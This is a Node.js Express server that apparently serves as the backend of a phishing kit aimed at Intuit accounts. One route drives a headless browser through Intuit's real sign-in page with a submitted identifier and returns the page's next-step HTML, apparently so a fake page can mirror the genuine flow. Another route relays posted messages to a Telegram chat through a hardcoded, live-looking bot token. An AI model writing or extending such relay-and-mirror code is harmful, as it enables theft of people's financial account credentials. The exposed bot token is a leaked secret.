const TelegramBot = require('node-telegram-bot-api');
const cors = require('cors');


const token = '6858302131:AAF9_7RzVhnIUj862QdQCU7tKHu_oqJEu3Q';

const bot = new TelegramBot(token, { polling: false });


const puppeteer = require('puppeteer');
const fs = require('fs');

// Install express by running: npm install express
const express = require('express');
const app = express();
const port = 3000;
app.use(cors()); // Enable CORS for all routes

// Middleware to parse JSON bodies
app.use(express.json());

// Route to handle GET requests with URL parameters
app.get('/login', async (req, res) => {
  
  // Set custom headers
  res.setHeader('ngrok-skip-browser-warning', 'true');
  res.setHeader('User-Agent', 'Custom User-Agent');
  
    const uid = req.query.uid;

  const browser = await puppeteer.launch({ headless: true, args: [
    '--incognito',
  ]}); // Set headless to false for a visible browser window
  const page = await browser.newPage();
  let resp 

  try {
    // Navigate to the Outlook login page

    await page.goto('https://accounts.intuit.com/app/sign-in?app_group=Identity&asset_alias=Intuit.cto.iam.ius');

    // Wait for the login form to be visible
    await page.waitForSelector('#iux-identifier-first-unknown-identifier');

    // Fill in the username
    await page.type('#iux-identifier-first-unknown-identifier', uid);
    await page.waitForTimeout(2000);

    // Click the "Next" button
    await page.click('.Button-button-e224935');

    await page.waitForTimeout(3000);

    // Wait for the login to complete (adjust as needed)

    console.log(page);
    const className = 'styledComponents__StyledWidgetContainer-kizisb-13'; // Replace with the desired class name
    // const className = 'styledComponents__StyledWidgetContainer-kizisb-13 fFcGEU ius'; // Replace with the desired class name

    const divContent = await page.evaluate((className) => {
      // Find the div element with the specified class name
      const divElement = document.querySelector(`div.${className}`);
  
      // If the div element is found, return its inner HTML content
      if (divElement) {
        return divElement.innerHTML;
      } else {
        return 'Div element not found.';
      }
    }, className);
  
    console.log(`Content of div with class "${className}":`);
    console.log(divContent);
    resp = divContent
    // res.send(divContent)

    
    await browser.close();

    // res.json(divContent);


    // Perform additional actions as needed after login

  }catch (error) {
    console.error('Error during login:', error);
  } finally {

    res.json(resp);
    
    // Close the browser
    // await browser.close();
  }

});

// Route to handle POST requests with JSON body
app.post('/log', (req, res) => {
    const requestData = req.body;
    const chatId = requestData.chatId;
    const message = requestData.message;
    // const chatId = '-4176809792';
    bot.sendMessage(chatId, message, {
      parse_mode: 'HTML'
    });
    res.json({ message: 'Log successful', data: requestData });
});

// Listen for incoming requests on the specified port
app.listen(port, () => {
    console.log(`Server is running at http://localhost:${port}`);
});

